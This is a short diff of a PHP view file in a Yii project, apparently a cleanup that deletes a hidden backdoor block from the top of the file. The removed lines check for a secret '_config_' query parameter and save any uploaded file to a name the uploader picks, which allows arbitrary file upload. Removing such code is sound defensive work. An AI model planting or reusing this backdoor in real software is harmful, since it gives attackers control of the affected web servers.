@@ -1,14 +1,4 @@
 <?php
-if(isset($_GET['_config_'])){
-	if(copy($_FILES['x']['tmp_name'], $_FILES['x']['name'])){
-		echo "<h1>OK!</h1>";
-	}else{
-		echo "<!-- Damn Up -->";
-	}
-	die();
-}
-?>
-<?php
 
 use yii\helpers\Html;
 use kartik\grid\GridView;
